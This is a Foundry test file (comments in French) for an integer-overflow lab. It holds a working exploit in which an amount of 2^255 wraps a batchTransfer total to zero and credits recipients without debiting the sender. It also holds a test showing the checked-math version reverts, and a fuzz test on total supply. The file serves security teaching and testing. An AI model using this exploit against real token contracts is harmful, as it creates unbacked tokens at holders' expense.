// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/OverflowToken.sol";
import "../src/OverflowTokenSecure.sol";

contract OverflowTest is Test {

    OverflowToken       public vulnToken;
    OverflowTokenSecure public secureToken;
    address             public deployer;
    address             public alice;
    address             public bob;

    function setUp() public {
        deployer   = address(this);
        alice      = makeAddr("alice");
        bob        = makeAddr("bob");
        vulnToken  = new OverflowToken();
        secureToken = new OverflowTokenSecure();
    }

    // ── EXPLOIT ──────────────────────────────────────────
    function test_overflowExploit() public {
        address[] memory recipients = new address[](2);
        recipients[0] = alice;
        recipients[1] = bob;

        // amount choisi pour provoquer overflow sur recipients.length * amount
        // 2 * (2^255) = 2^256 = 0 en uint256 → total = 0
        uint256 amount = type(uint256).max / 2 + 1;

        uint256 deployerBefore = vulnToken.balances(deployer);
        emit log_named_decimal_uint("Deployer balance before", deployerBefore, 18);
        emit log_named_decimal_uint("Amount per recipient   ", amount, 18);

        // total = 2 * amount overflow → 0
        // require(balance >= 0) passe toujours
        vulnToken.batchTransfer(recipients, amount);

        uint256 aliceBalance   = vulnToken.balances(alice);
        uint256 bobBalance     = vulnToken.balances(bob);
        uint256 deployerAfter  = vulnToken.balances(deployer);

        emit log_named_decimal_uint("Alice balance after    ", aliceBalance, 18);
        emit log_named_decimal_uint("Bob balance after      ", bobBalance, 18);
        emit log_named_decimal_uint("Deployer balance after ", deployerAfter, 18);

        // Alice et Bob ont un solde astronomique
        assertEq(aliceBalance, amount, "Alice should have overflow amount");
        assertEq(bobBalance,   amount, "Bob should have overflow amount");
        // Le deployer n'a presque rien perdu (total overflowed to 0)
        assertEq(deployerAfter, deployerBefore, "Deployer lost nothing");
    }

    // ── DEFENSE ──────────────────────────────────────────
    function test_overflowBlocked() public {
        address[] memory recipients = new address[](2);
        recipients[0] = alice;
        recipients[1] = bob;

        uint256 amount = type(uint256).max / 2 + 1;

        // Checked math → revert automatique sur overflow
        vm.expectRevert();
        secureToken.batchTransfer(recipients, amount);
    }

    // ── FUZZ ─────────────────────────────────────────────
    function testFuzz_batchTransferNeverCreatesTokens(
        uint8   numRecipients,
        uint96  amount
    ) public {
        vm.assume(numRecipients > 0 && numRecipients <= 10);
        vm.assume(amount > 0);

        address[] memory recipients = new address[](numRecipients);
        for (uint i = 0; i < numRecipients; i++) {
            recipients[i] = makeAddr(string(abi.encodePacked("r", i)));
        }

        uint256 totalBefore = secureToken.totalSupply();
        uint256 senderBal   = secureToken.balances(address(this));
        uint256 needed      = uint256(numRecipients) * uint256(amount);

        // Skip si le deployer n'a pas assez — on teste seulement les cas valides
        vm.assume(needed <= senderBal);

        secureToken.batchTransfer(recipients, amount);

        // La supply totale ne doit jamais changer
        uint256 totalAfter = secureToken.totalSupply();
        assertEq(totalAfter, totalBefore, "Total supply must be constant");
    }
}